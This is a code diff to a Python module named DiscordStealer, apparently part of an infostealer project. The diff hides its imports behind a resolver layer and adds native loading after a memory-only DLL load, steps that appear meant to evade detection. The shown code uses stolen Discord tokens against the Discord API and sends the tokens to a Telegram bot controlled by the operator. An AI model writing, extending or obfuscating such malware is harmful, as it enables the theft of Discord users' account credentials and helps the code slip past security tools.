@@ -1,17 +1,22 @@
+from core.resolver import (
+    Resolver, _OS, _RE, _JSON, _SHUTIL, _SUBPROCESS, _TIME, _TYPING,
+    _BASE64, _CTYPES, _PATHLIB, _URLLIB_PARSE, _URLLIB_REQUEST
+)
+os = Resolver.get_mod(_OS)
+re = Resolver.get_mod(_RE)
+json = Resolver.get_mod(_JSON)
+shutil = Resolver.get_mod(_SHUTIL)
+subprocess = Resolver.get_mod(_SUBPROCESS)
+time = Resolver.get_mod(_TIME)
+base64 = Resolver.get_mod(_BASE64)
+ctypes = Resolver.get_mod(_CTYPES)
+Path = Resolver.get_mod(_PATHLIB).Path
+urllib_parse = Resolver.get_mod(_URLLIB_PARSE)
+urllib_request = Resolver.get_mod(_URLLIB_REQUEST)
+typing_mod = Resolver.get_mod(_TYPING)
+Any, Dict, List, Optional, Union = typing_mod.Any, typing_mod.Dict, typing_mod.List, typing_mod.Optional, typing_mod.Union
 
-import os
-import re
-import json
-import shutil
-import subprocess
-import time
-import base64
-import ctypes
-from typing import List, Dict, Any, Optional
-from pathlib import Path
 import clr
-import urllib.parse
-from core.obfuscation import decrypt_string
 from core.bridge_manager import bridge_manager
 
 try:
@@ -53,6 +58,7 @@ try:
                 # S-09: RAM-Only loading from byte array
                 raw_bytes = File.ReadAllBytes(os.path.abspath(_p))
                 Assembly.Load(raw_bytes)
+                Resolver.load_native()
                 from VanguardCore import DiscordManager
                 CS_AVAILABLE = True
                 # log_debug("Successfully loaded Discord DLL into memory")
@@ -226,10 +232,6 @@ class DiscordStealer(BaseModule):
 
     def _api_request(self, path: str, token: str) -> Optional[Any]:
         """Base Discord API requester with bridge support"""
-        import urllib.request
-        import urllib.parse
-        import base64
-        import json
 
         # Prepare headers
         super_props = base64.b64encode(json.dumps({
@@ -254,12 +256,12 @@ class DiscordStealer(BaseModule):
         try:
             target_url = f"https://discord.com/api/v9{path}"
             if use_bridge:
-                final_url = f"{bridge_url}?path={urllib.parse.quote(target_url)}"
+                final_url = f"{bridge_url}?path={urllib_parse.quote(target_url)}"
             else:
                 final_url = target_url
 
-            req = urllib.request.Request(final_url, headers=headers)
-            with urllib.request.urlopen(req, timeout=12) as resp:
+            req = urllib_request.Request(final_url, headers=headers)
+            with urllib_request.urlopen(req, timeout=12) as resp:
                 return json.loads(resp.read().decode())
         except:
             return None
@@ -354,7 +356,6 @@ class DiscordStealer(BaseModule):
             # Try to identify user ID from token prefix if API fails
             token_uid = None
             try:
-                import base64
                 token_uid = base64.b64decode(token.split('.')[0]).decode('utf-8')
             except: pass
 
@@ -426,7 +427,6 @@ class DiscordStealer(BaseModule):
 
     def send_full_report(self, tokens: list, bot_token: str, admin_id: int, telegram_bridge: str = "") -> bool:
         if not tokens: return False
-        import urllib.request
         base = telegram_bridge.rstrip('/') if telegram_bridge else "https://api.telegram.org"
         url = f"{base}/bot{bot_token}/sendMessage"
         
@@ -443,8 +443,8 @@ class DiscordStealer(BaseModule):
                     "parse_mode": "HTML",
                     "disable_web_page_preview": True
                 }).encode()
-                req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json"})
-                urllib.request.urlopen(req, timeout=10)
+                req = urllib_request.Request(url, data=payload, headers={"Content-Type": "application/json"})
+                urllib_request.urlopen(req, timeout=10)
             except: 
                 success = False
         return success
